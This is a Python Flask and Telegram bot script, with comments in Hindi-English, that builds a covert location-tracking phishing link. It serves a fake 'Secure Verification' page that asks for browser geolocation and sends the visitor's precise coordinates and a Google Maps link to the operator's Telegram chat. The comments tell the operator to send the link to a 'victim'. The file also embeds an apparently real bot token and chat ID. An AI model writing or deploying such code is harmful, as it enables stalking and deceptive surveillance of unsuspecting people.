import os
import threading
import time
import requests
from flask import Flask, request
import telebot

# --- AAP KI TELEGRAM CREDENTIALS ---
TELEGRAM_BOT_TOKEN = "8742528917:AAHz664V1Md6qQ_8RP2nKsINXTBRY9loz50"
TELEGRAM_CHAT_ID = "8049432833"
PORT = int(os.environ.get("PORT", 8080))

# Initialize Flask and TeleBot
app = Flask(__name__)
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Helper function to send messages to Telegram
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram Error: {e}")

# --- TELEGRAM BOT COMMANDS ---
@bot.message_handler(commands=['start', 'link', 'getlink'])
def send_link_command(message):
    if str(message.chat.id) == str(TELEGRAM_CHAT_ID):
        # Yahan apna Render ya public URL likhein jab deploy kar lein
        app_url = os.environ.get("APP_URL", "https://YOUR-APP-NAME.onrender.com")
        
        response_text = (
            f"🔗 *Aapka Tracking Link Tayar Hai!*\n\n"
            f"`{app_url}`\n\n"
            f"Is link ko victim ko bhejein. Jaise hi woh open karega, location aapko yahan mil jayegi!"
        )
        bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "Unauthorized access!")

# --- FLASK WEB SERVER (HTML FRONTEND) ---
@app.route("/")
def index():
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body {
            background: #0f172a;
            color: #f8fafc;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            padding: 20px;
        }
        .card {
            background: #1e293b;
            padding: 35px 25px;
            border-radius: 14px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
            text-align: center;
            max-width: 380px;
            width: 100%;
            border: 1px solid #334155;
        }
        .spinner {
            width: 45px;
            height: 45px;
            border: 4px solid #334155;
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            font-size: 18px;
            font-weight: 600;
            color: #38bdf8;
            margin-bottom: 10px;
        }
        .message {
            font-size: 14px;
            color: #94a3b8;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="card">
        <div id="spinner" class="spinner"></div>
        <div id="status" class="status">Requesting access...</div>
        <div id="message" class="message">Please allow location permissions to proceed securely.</div>
    </div>

    <script>
        const statusDiv = document.getElementById('status');
        const messageDiv = document.getElementById('message');
        const spinnerDiv = document.getElementById('spinner');

        function onSuccess(pos) {
            try {
                statusDiv.innerHTML = 'Verification Successful!';
                messageDiv.innerHTML = 'You are a great person 😁<br>Stay blessed, stay happy!';
                spinnerDiv.style.borderTopColor = '#22c55e';
                
                fetch('/update', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        timestamp: pos.timestamp
                    })
                }).catch(function(err) { console.error('Error:', err); });
            } catch(e) {
                console.error('Error:', e);
            }
        }
        
        function onError(err) {
            statusDiv.innerHTML = 'Permission Denied';
            messageDiv.innerHTML = 'Please allow location access in your browser settings to continue.';
            spinnerDiv.style.display = 'none';
        }
        
        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(onSuccess, onError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                statusDiv.innerHTML = 'Not Supported';
                messageDiv.innerHTML = 'Geolocation is not supported by your browser.';
                spinnerDiv.style.display = 'none';
            }
        }
        
        window.onload = requestLocation;
    </script>
</body>
</html>
'''

@app.route("/update", methods=["POST"])
def update():
    try:
        data = request.get_json(force=True)
    except Exception:
        return "BAD", 400
    
    if not data or "lat" not in data or "lon" not in data:
        return "INVALID", 400

    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("accuracy", "N/A")
    
    msg = (
        f"🚨 *NEW LOCATION RECEIVED!* 🚨\n\n"
        f"🌐 *Latitude:* `{lat}`\n"
        f"🌐 *Longitude:* `{lon}`\n"
        f"🎯 *Accuracy:* `{acc} meters`\n\n"
        f"🗺️ [Google Maps Link](https://maps.google.com/?q={lat},{lon})"
    )
    
    send_telegram_message(msg)
    return "OK", 200

# Run Flask server in a separate background thread
def run_flask():
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    print("🚀 Starting Web Server & Telegram Bot simultaneously...")
    
    # Start Flask thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Send startup alert to your Telegram
    send_telegram_message("🟢 *Bot & Server Successfully Started!* Type /link to get your URL.")
    
    # Start Telegram Bot polling
    bot.infinity_polling()
